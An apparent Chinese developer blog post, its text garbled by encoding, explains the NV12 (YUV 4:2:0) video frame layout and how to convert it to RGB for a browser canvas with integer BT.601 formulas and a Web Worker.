#ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">å‰è¨€</h2>
<p>ç”±äºæµè§ˆå™¨æ— æ³•ç›´æ¥æ˜¾ç¤º NV12 æ ¼å¼ï¼Œéœ€è¦è½¬æ¢ä¸º RGB æ‰èƒ½åœ¨ Canvas æˆ– Image ä¸­æ˜¾ç¤ºã€‚</p>
<h2 data-id="heading-1">åŸºç¡€æ¦‚å¿µ</h2>
<h3 data-id="heading-2">ä»€ä¹ˆæ˜¯ YUVï¼Ÿ</h3>
<p>YUV æ˜¯ä¸€ç§é¢œè‰²ç¼–ç ç³»ç»Ÿï¼Œä¸ RGB ä¸åŒï¼š</p>
<ul>
<li><strong>Yï¼ˆäº®åº¦ï¼‰</strong> ï¼šè¡¨ç¤ºå›¾åƒçš„æ˜æš—ç¨‹åº¦ï¼Œäººçœ¼å¯¹äº®åº¦æœ€æ•æ„Ÿ</li>
<li><strong>Uï¼ˆè‰²åº¦ï¼‰</strong> ï¼šè¡¨ç¤ºè“è‰²ä¸äº®åº¦çš„å·®å€¼</li>
<li><strong>Vï¼ˆè‰²åº¦ï¼‰</strong> ï¼šè¡¨ç¤ºçº¢è‰²ä¸äº®åº¦çš„å·®å€¼</li>
</ul>
<h3 data-id="heading-3">ä»€ä¹ˆæ˜¯ NV12ï¼Ÿ</h3>
<p>NV12 æ˜¯ YUV æ ¼å¼çš„ä¸€ç§ï¼Œé‡‡ç”¨ <strong>4:2:0 é‡‡æ ·</strong>ï¼š</p>
<ul>
<li><strong>4:2:0</strong> è¡¨ç¤ºï¼šæ¯ 4 ä¸ª Y åƒç´ å…±äº« 1 ä¸ª UV åƒç´ å¯¹</li>
<li><strong>å­˜å‚¨æ–¹å¼</strong>ï¼šY å¹³é¢å®Œæ•´å­˜å‚¨ï¼ŒUV å¹³é¢äº¤é”™å­˜å‚¨ï¼ˆUã€Vã€Uã€V...ï¼‰</li>
<li><strong>æ•°æ®å¤§å°</strong>ï¼š<code>width Ã— height Ã— 1.5</code> å­—èŠ‚</li>
</ul>
<h3 data-id="heading-4">RGB vs YUV vs NV12</h3>





























<table><thead><tr><th>æ ¼å¼</th><th>æ•°æ®å¤§å°</th><th>ç”¨é€”</th><th>æµè§ˆå™¨æ”¯æŒ</th></tr></thead><tbody><tr><td>RGB</td><td><code>width Ã— height Ã— 3</code></td><td>æ˜¾ç¤ºã€ç¼–è¾‘</td><td>âœ… åŸç”Ÿæ”¯æŒ</td></tr><tr><td>YUV</td><td>å¤šç§å˜ä½“</td><td>è§†é¢‘ç¼–ç </td><td>âŒ éœ€è¦è½¬æ¢</td></tr><tr><td>NV12</td><td><code>width Ã— height Ã— 1.5</code></td><td>è§†é¢‘å¤„ç†</td><td>âŒ éœ€è¦è½¬æ¢</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-5">NV12 æ ¼å¼è¯¦è§£</h2>
<h3 data-id="heading-6">æ•°æ®å¸ƒå±€</h3>
<p>NV12 æ•°æ®ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Y å¹³é¢ï¼ˆäº®åº¦ï¼‰ Â  Â  Â  Â  Â  Â  Â  Â   â”‚
â”‚  å¤§å°ï¼šwidth Ã— height å­—èŠ‚ Â  Â  Â  â”‚
â”‚  æ¯ä¸ªåƒç´  <span class="hljs-number">1</span> å­—èŠ‚ Â  Â  Â  Â  Â  Â  Â  Â  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  UV å¹³é¢ï¼ˆè‰²åº¦ï¼Œäº¤é”™å­˜å‚¨ï¼‰ Â  Â  Â  â”‚
â”‚  å¤§å°ï¼šwidth Ã— height / <span class="hljs-number">2</span> å­—èŠ‚ Â  â”‚
â”‚  æ ¼å¼ï¼šU V U V U V ... Â  Â  Â  Â   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â€‹
æ€»å¤§å° = width Ã— height Ã— <span class="hljs-number">1.5</span> å­—èŠ‚
</code></pre>
<h3 data-id="heading-7">ç¤ºä¾‹ï¼š1920Ã—1080 å›¾åƒ</h3>
<pre><code class="hljs language-ini" lang="ini">Y å¹³é¢ï¼š1920 Ã— <span class="hljs-attr">1080</span> = <span class="hljs-number">2</span>,<span class="hljs-number">073</span>,<span class="hljs-number">600</span> å­—èŠ‚
UV å¹³é¢ï¼š1920 Ã— 1080 / <span class="hljs-attr">2</span> = <span class="hljs-number">1</span>,<span class="hljs-number">036</span>,<span class="hljs-number">800</span> å­—èŠ‚
æ€»å¤§å°ï¼š3,110,400 å­—èŠ‚
â€‹
æ•°æ®æ’åˆ—ï¼š
<span class="hljs-section">[Y Y Y Y ... Y]</span> <span class="hljs-section">[U V U V U V ... U V]</span>
 â†‘ 2,073,600 å­—èŠ‚  â†‘ 1,036,800 å­—èŠ‚
</code></pre>
<h3 data-id="heading-8">4:2:0 é‡‡æ ·è¯´æ˜</h3>
<pre><code class="hljs language-csharp" lang="csharp">åƒç´ å¸ƒå±€ï¼ˆ<span class="hljs-number">2</span>Ã—<span class="hljs-number">2</span> åƒç´ å—ï¼‰ï¼š
â”Œâ”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”
â”‚ Yâ‚  â”‚ Yâ‚‚  â”‚  â† <span class="hljs-number">4</span> ä¸ª Y å€¼
â”œâ”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”¤
â”‚ Yâ‚ƒ  â”‚ Yâ‚„  â”‚
â””â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”˜
 Â  Â  â†“
  å…±äº« <span class="hljs-number">1</span> ä¸ª UV å¯¹
 Â  Â  â†“
 Â  [<span class="hljs-meta">U, V</span>]
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆè¿™æ ·è®¾è®¡ï¼Ÿ</strong></p>
<ul>
<li>äººçœ¼å¯¹äº®åº¦ï¼ˆYï¼‰æ›´æ•æ„Ÿï¼Œå¯¹è‰²åº¦ï¼ˆUVï¼‰ä¸æ•æ„Ÿ</li>
<li>å‡å°‘è‰²åº¦æ•°æ®å¯ä»¥èŠ‚çœ 50% å­˜å‚¨ç©ºé—´</li>
<li>è§†é¢‘ç¼–ç æ ‡å‡†ï¼ˆH.264/H.265ï¼‰åŸºäºæ­¤åŸç†</li>
</ul>
<hr/>
<h2 data-id="heading-9">ä½¿ç”¨åœºæ™¯</h2>
<h3 data-id="heading-10">1. è§†é¢‘ç¼–ç /è§£ç </h3>
<p>è§†é¢‘ç¼–è§£ç å™¨ï¼ˆH.264ã€H.265/HEVCã€VP8ã€VP9ï¼‰çš„ä¸­é—´æ ¼å¼ï¼š</p>
<pre><code class="hljs">è§†é¢‘æ–‡ä»¶ â†’ è§£ç å™¨ â†’ NV12 æ ¼å¼å¸§ â†’ è½¬æ¢ä¸º RGB â†’ æ˜¾ç¤º
</code></pre>
<h3 data-id="heading-11">2. æ‘„åƒå¤´/è§†é¢‘æµ</h3>
<p>æ‘„åƒå¤´é‡‡é›†çš„åŸå§‹æ•°æ®é€šå¸¸æ˜¯ YUVï¼ˆNV12 æ˜¯å…¶ä¸­ä¸€ç§ï¼‰ï¼š</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-comment">// WebRTC ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> stream = <span class="hljs-keyword">await</span> navigator.mediaDevices.getUserMedia({ video: <span class="hljs-literal">true</span> })
<span class="hljs-keyword">const</span> videoTrack = stream.getVideoTracks()[<span class="hljs-number">0</span>]
<span class="hljs-keyword">const</span> imageCapture = <span class="hljs-keyword">new</span> ImageCapture(videoTrack)
<span class="hljs-comment">// æŸäº› API å¯èƒ½è¿”å› NV12 æ ¼å¼çš„åŸå§‹æ•°æ®</span>
</code></pre>
<h3 data-id="heading-12">3. WebRTC è§†é¢‘å¤„ç†</h3>
<ul>
<li>WebRTC çš„ <code>VideoFrame</code> API å¯èƒ½æä¾› NV12 æ ¼å¼</li>
<li>è§†é¢‘ä¼šè®®ã€ç›´æ’­ç­‰åœºæ™¯ä¸­çš„åŸå§‹å¸§æ•°æ®</li>
</ul>
<h3 data-id="heading-13">4. ç§»åŠ¨ç«¯å¼€å‘</h3>
<ul>
<li><strong>Android</strong>ï¼šCamera2 API è¾“å‡ºçš„æ ¼å¼ä¹‹ä¸€ï¼ˆ<code>ImageFormat.YUV_420_888</code>ï¼‰</li>
<li><strong>iOS</strong>ï¼šVideoToolbox å¯èƒ½è¾“å‡º NV12</li>
<li>ç§»åŠ¨ç«¯è§†é¢‘å¤„ç†åº“çš„å¸¸è§è¾“å‡ºæ ¼å¼</li>
</ul>
<h3 data-id="heading-14">5. FFmpeg/è§†é¢‘å¤„ç†åº“</h3>
<pre><code class="hljs language-css" lang="css"># FFmpeg å¤„ç†è§†é¢‘æ—¶ç»å¸¸ä½¿ç”¨ NV12
ffmpeg -<span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.mp4</span> -pix_fmt nv12 output<span class="hljs-selector-class">.nv12</span>
</code></pre>
<h3 data-id="heading-15">6. ç¡¬ä»¶åŠ é€Ÿ</h3>
<ul>
<li>GPU è§†é¢‘è§£ç å™¨ï¼ˆNVIDIA NVENCã€Intel Quick Syncï¼‰çš„è¾“å‡º</li>
<li>ç¡¬ä»¶ç¼–ç å™¨é€šå¸¸ä½¿ç”¨ NV12 ä½œä¸ºè¾“å…¥/è¾“å‡ºæ ¼å¼</li>
</ul>
<hr/>
<h2 data-id="heading-16">ä¸ºä»€ä¹ˆé€‰æ‹© NV12</h2>
<h3 data-id="heading-17">1. å­˜å‚¨æ•ˆç‡</h3>
<p><strong>å¯¹æ¯”ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">1920 Ã— 1080 å›¾åƒï¼š
â€‹
RGBï¼š1920 Ã— 1080 Ã— <span class="hljs-attr">3</span> = <span class="hljs-number">6</span>,<span class="hljs-number">220</span>,<span class="hljs-number">800</span> å­—èŠ‚
NV12ï¼š1920 Ã— 1080 Ã— <span class="hljs-attr">1.5</span> = <span class="hljs-number">3</span>,<span class="hljs-number">110</span>,<span class="hljs-number">400</span> å­—èŠ‚
â€‹
èŠ‚çœï¼š50% å­˜å‚¨ç©ºé—´
</code></pre>
<h3 data-id="heading-18">2. ç¡¬ä»¶æ”¯æŒ</h3>
<ul>
<li>å¤§å¤šæ•°ç¡¬ä»¶ç¼–ç å™¨åŸç”Ÿæ”¯æŒ NV12</li>
<li>è½¬æ¢æˆæœ¬ä½ï¼Œæ€§èƒ½å¥½</li>
</ul>
<h3 data-id="heading-19">3. è§†é¢‘ç¼–ç æ ‡å‡†</h3>
<ul>
<li>ä¸»æµè§†é¢‘ç¼–ç æ ‡å‡†ï¼ˆH.264ã€H.265ï¼‰åŸºäº YUV</li>
<li>NV12 æ˜¯å¸¸è§çš„ YUV æ ¼å¼ï¼Œå…¼å®¹æ€§å¥½</li>
</ul>
<h3 data-id="heading-20">4. äººçœ¼ç‰¹æ€§</h3>
<ul>
<li>äººçœ¼å¯¹äº®åº¦ï¼ˆYï¼‰æ•æ„Ÿï¼Œå¯¹è‰²åº¦ï¼ˆUVï¼‰ä¸æ•æ„Ÿ</li>
<li>4:2:0 é‡‡æ ·ç¬¦åˆäººçœ¼ç‰¹æ€§ï¼Œåœ¨è§†è§‰è´¨é‡æŸå¤±å¾ˆå°çš„æƒ…å†µä¸‹å¤§å¹…å‡å°‘æ•°æ®é‡</li>
</ul>
<hr/>
<h2 data-id="heading-21">è½¬æ¢åŸç†</h2>
<h3 data-id="heading-22">YUV â†’ RGB è½¬æ¢å…¬å¼</h3>
<p>æˆ‘ä»¬ä½¿ç”¨ <strong>ITU-R BT.601</strong> æ ‡å‡†çš„è½¬æ¢å…¬å¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">// æ ‡å‡†å…¬å¼ï¼ˆæµ®ç‚¹ï¼‰
<span class="hljs-attr">R</span> = Y + <span class="hljs-number">1.402</span> Ã— (V - <span class="hljs-number">128</span>)
<span class="hljs-attr">G</span> = Y - <span class="hljs-number">0.344</span> Ã— (U - <span class="hljs-number">128</span>) - <span class="hljs-number">0.714</span> Ã— (V - <span class="hljs-number">128</span>)
<span class="hljs-attr">B</span> = Y + <span class="hljs-number">1.772</span> Ã— (U - <span class="hljs-number">128</span>)
â€‹
// ä¼˜åŒ–åçš„æ•´æ•°è¿ç®—ï¼ˆä»£ç ä¸­ä½¿ç”¨ï¼‰
let <span class="hljs-attr">r</span> = y + ((<span class="hljs-number">359</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>) Â  Â  Â // <span class="hljs-number">1.402</span> â‰ˆ <span class="hljs-number">359</span>/<span class="hljs-number">256</span>
let <span class="hljs-attr">g</span> = y - ((<span class="hljs-number">88</span> * u + <span class="hljs-number">183</span> * v + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>) Â // <span class="hljs-number">0.344</span>â‰ˆ<span class="hljs-number">88</span>/<span class="hljs-number">256</span>, <span class="hljs-number">0.714</span>â‰ˆ<span class="hljs-number">183</span>/<span class="hljs-number">256</span>
let <span class="hljs-attr">b</span> = y + ((<span class="hljs-number">454</span> * u + <span class="hljs-number">128</span>) &gt;&gt; <span class="hljs-number">8</span>) Â  Â  Â // <span class="hljs-number">1.772</span> â‰ˆ <span class="hljs-number">454</span>/<span class="hljs-number">256</span>
â€‹
// é™åˆ¶å€¼åœ¨ 0-255 èŒƒå›´å†…
<span class="hljs-attr">r</span> = r &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : r &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : r
<span class="hljs-attr">g</span> = g &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : g &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : g
<span class="hljs-attr">b</span> = b &lt; <span class="hljs-number">0</span> ? <span class="hljs-number">0</span> : b &gt; <span class="hljs-number">255</span> ? <span class="hljs-number">255</span> : b
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆä½¿ç”¨æ•´æ•°è¿ç®—ï¼Ÿ</strong></p>
<ul>
<li><code>&gt;&gt; 8</code> ç›¸å½“äºé™¤ä»¥ 256ï¼Œæ¯”æµ®ç‚¹è¿ç®—å¿«</li>
<li>é¿å…æµ®ç‚¹æ•°ç²¾åº¦é—®é¢˜</li>
<li>æ€§èƒ½æ›´å¥½</li>
</ul>
<h3 data-id="heading-23">è½¬æ¢æµç¨‹</h3>
<pre><code class="hljs language-arduino" lang="arduino">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  NV12 åŸå§‹æ•°æ®  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æå– Y å¹³é¢ Â   â”‚  â† width Ã— height å­—èŠ‚
â”‚  ï¼ˆäº®åº¦ä¿¡æ¯ï¼‰ Â   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æå– UV å¹³é¢ Â  â”‚  â† width Ã— height / <span class="hljs-number">2</span> å­—èŠ‚
â”‚  ï¼ˆè‰²åº¦ï¼Œäº¤é”™ï¼‰  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  å¯¹æ¯ä¸ªåƒç´ ï¼š Â   â”‚
â”‚  <span class="hljs-number">1.</span> è®¡ç®— UV ç´¢å¼•â”‚  â† <span class="hljs-number">4</span>:<span class="hljs-number">2</span>:<span class="hljs-number">0</span> é‡‡æ ·æ˜ å°„
â”‚  <span class="hljs-number">2.</span> åº”ç”¨è½¬æ¢å…¬å¼â”‚  â† YUV â†’ RGB
â”‚  <span class="hljs-number">3.</span> é™åˆ¶å€¼èŒƒå›´  â”‚  â† <span class="hljs-number">0</span><span class="hljs-number">-255</span> clamp
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç”Ÿæˆ RGBA æ•°æ® â”‚  â† width Ã— height Ã— <span class="hljs-number">4</span> å­—èŠ‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”˜
 Â  Â  Â  Â  â”‚
 Â  Â  Â  Â  â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  ç»˜åˆ¶åˆ° Canvas  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h3 data-id="heading-24">UV ç´¢å¼•è®¡ç®—è¯¦è§£</h3>
<p>è¿™æ˜¯è½¬æ¢ä¸­æœ€å…³é”®çš„éƒ¨åˆ†ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// å¯¹äºåƒç´ ä½ç½® (x, y)ï¼Œè®¡ç®—å…¶åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•</span>
<span class="hljs-type">const</span> i = y * width + x
â€‹
<span class="hljs-comment">// è®¡ç®—å¯¹åº”çš„ UV è¡Œï¼ˆ4:2:0 é‡‡æ ·ï¼ŒUV è¡Œæ˜¯ Y è¡Œçš„ä¸€åŠï¼‰</span>
<span class="hljs-type">const</span> uvRow = (i / width | <span class="hljs-number">0</span>) &gt;&gt; <span class="hljs-number">1</span> Â <span class="hljs-comment">// ç­‰ä»·äº Math.floor(y / 2)</span>
â€‹
<span class="hljs-comment">// è®¡ç®—å¯¹åº”çš„ UV åˆ—ï¼ˆå¿…é¡»æ˜¯å¶æ•°ï¼‰</span>
<span class="hljs-type">const</span> uvCol = (i % width) &amp; ~<span class="hljs-number">1</span> Â  Â  Â  <span class="hljs-comment">// ç­‰ä»·äº Math.floor(x / 2) * 2</span>
â€‹
<span class="hljs-comment">// è®¡ç®— UV åœ¨æ•°ç»„ä¸­çš„ç´¢å¼•</span>
<span class="hljs-type">const</span> uvIndex = uvRow * width + uvCol
â€‹
<span class="hljs-comment">// è·å– U å’Œ V å€¼</span>
<span class="hljs-type">const</span> u = uv[uvIndex] - <span class="hljs-number">128</span> Â  Â  Â <span class="hljs-comment">// U å€¼ï¼ˆåç§» 128ï¼‰</span>
<span class="hljs-type">const</span> v = uv[uvIndex + <span class="hljs-number">1</span>] - <span class="hljs-number">128</span> Â <span class="hljs-comment">// V å€¼ï¼ˆåç§» 128ï¼‰</span>
</code></pre>
<p><strong>ç¤ºä¾‹ï¼šåƒç´  (100, 50) åœ¨ 1920Ã—1080 å›¾åƒä¸­</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">i</span> = <span class="hljs-number">50</span> * <span class="hljs-number">1920</span> + <span class="hljs-number">100</span> = <span class="hljs-number">96</span>,<span class="hljs-number">100</span>
<span class="hljs-attr">uvRow</span> = (<span class="hljs-number">96</span>,<span class="hljs-number">100</span> / <span class="hljs-number">1920</span>) &gt;&gt; <span class="hljs-number">1</span> = <span class="hljs-number">25</span>
<span class="hljs-attr">uvCol</span> = (<span class="hljs-number">96</span>,<span class="hljs-number">100</span> % <span class="hljs-number">1920</span>) &amp; ~<span class="hljs-number">1</span> = <span class="hljs-number">100</span>
<span class="hljs-attr">uvIndex</span> = <span class="hljs-number">25</span> * <span class="hljs-number">1920</span> + <span class="hljs-number">100</span> = <span class="hljs-number">48</span>,<span class="hljs-number">100</span>
â€‹
// è¯»å– UV å€¼
<span class="hljs-attr">u</span> = uv[<span class="hljs-number">48</span>,<span class="hljs-number">100</span>] - <span class="hljs-number">128</span>
<span class="hljs-attr">v</span> = uv[<span class="hljs-number">48</span>,<span class="hljs-number">101</span>] - <span class="hljs-number">128</span>
</code></pre>
<hr/>
<h2 data-id="heading-25">å®ç°ç»†èŠ‚</h2>
<h3 data-id="heading-26">ä¸ºä»€ä¹ˆä½¿ç”¨ Web Workerï¼Ÿ</h3>
<p>è½¬æ¢æ˜¯ <strong>CPU å¯†é›†å‹æ“ä½œ</strong>ï¼š</p>
<pre><code class="hljs language-diff" lang="diff">1920 Ã— 1080 å›¾åƒ = 2,073,600 åƒç´ 
â€‹
æ¯ä¸ªåƒç´ éœ€è¦ï¼š
<span class="hljs-deletion">- 1 æ¬¡ Y å€¼è¯»å–</span>
<span class="hljs-deletion">- 1 æ¬¡ UV ç´¢å¼•è®¡ç®—</span>
<span class="hljs-deletion">- 1 æ¬¡ UV å€¼è¯»å–</span>
<span class="hljs-deletion">- 3 æ¬¡ä¹˜æ³•è¿ç®—</span>
<span class="hljs-deletion">- 3 æ¬¡åŠ æ³•è¿ç®—</span>
<span class="hljs-deletion">- 3 æ¬¡ clamp æ“ä½œ</span>
â€‹
æ€»è®¡ï¼šçº¦ 2,000 ä¸‡æ¬¡è¿ç®—
</code></pre>
<p><strong>åœ¨ä¸»çº¿ç¨‹æ‰§è¡Œçš„é—®é¢˜ï¼š</strong></p>
<ul>
<li>âŒ é˜»å¡ UIï¼Œé¡µé¢å¡é¡¿</li>
<li>âŒ ç”¨æˆ·ä½“éªŒå·®</li>
<li>âŒ æ— æ³•åˆ©ç”¨å¤šæ ¸ CPU</li>
</ul>
<p><strong>ä½¿ç”¨ Web Worker çš„ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>âœ… åå°å¤„ç†ï¼Œä¸é˜»å¡ UI</li>
<li>âœ… åˆ©ç”¨å¤šæ ¸ CPU</li>
<li>âœ… æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ</li>
</ul>
<h3 data-id="heading-27">ä¸ºä»€ä¹ˆéœ€è¦æå‰çŸ¥é“å›¾ç‰‡çš„å®½é«˜ï¼Ÿ</h3>
<h4 data-id="heading-28">1. æ²¡æœ‰æ–‡ä»¶å¤´/å…ƒæ•°æ®</h4>
<p>NV12 æ–‡ä»¶æ˜¯çº¯åƒç´ æ•°æ®ï¼Œä¸åƒå¸¸è§å›¾ç‰‡æ ¼å¼åŒ…å«å…ƒæ•°æ®ï¼š</p>
<pre><code class="hljs">PNG/JPEG æ–‡ä»¶ç»“æ„ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æ–‡ä»¶å¤´ Â  Â  â”‚ â† åŒ…å«å®½é«˜ã€æ ¼å¼ç­‰ä¿¡æ¯
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  å…ƒæ•°æ® Â  Â  â”‚ â† é¢œè‰²ç©ºé—´ã€å‹ç¼©å‚æ•°ç­‰
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  åƒç´ æ•°æ® Â  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
â€‹
NV12 æ–‡ä»¶ç»“æ„ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  åƒç´ æ•°æ® Â  â”‚ â† åªæœ‰åŸå§‹å­—èŠ‚ï¼Œæ²¡æœ‰ä»»ä½•å…ƒæ•°æ®ï¼
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-29">2. éœ€è¦å®½é«˜æ¥è®¡ç®—æ•°æ®å¸ƒå±€</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">// nv12Worker.ts</span>
<span class="hljs-type">const</span> { nv12, width, height } = e.data
<span class="hljs-type">const</span> yLen = width * height
<span class="hljs-type">const</span> uv = nv12.<span class="hljs-built_in">subarray</span>(yLen) Â <span class="hljs-comment">// éœ€è¦çŸ¥é“ yLen æ‰èƒ½åˆ†å‰²æ•°æ®</span>
</code></pre>
<h4 data-id="heading-30">3. éœ€è¦å®½é«˜æ¥éªŒè¯æ–‡ä»¶å¤§å°</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> expectedSize = width * height * <span class="hljs-number">1.5</span>
<span class="hljs-keyword">if</span> (file.size !== expectedSize) {
 Â message.<span class="hljs-built_in">error</span>(
 Â  Â `æ–‡ä»¶å¤§å°ä¸åŒ¹é…ï¼æœŸæœ›: ${expectedSize} å­—èŠ‚ï¼Œå®é™…: ${file.size} å­—èŠ‚`
  )
 Â <span class="hljs-keyword">return</span>
}
</code></pre>
<h4 data-id="heading-31">4. éœ€è¦å®½é«˜æ¥æ­£ç¡®è§£æ UV æ•°æ®</h4>
<p>UV æ•°æ®çš„ç´¢å¼•è®¡ç®—å®Œå…¨ä¾èµ–å®½é«˜ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-type">const</span> uvRow = (i / width | <span class="hljs-number">0</span>) &gt;&gt; <span class="hljs-number">1</span> Â <span class="hljs-comment">// éœ€è¦ width</span>
<span class="hljs-type">const</span> uvCol = (i % width) &amp; ~<span class="hljs-number">1</span> Â  Â  Â  <span class="hljs-comment">// éœ€è¦ width</span>
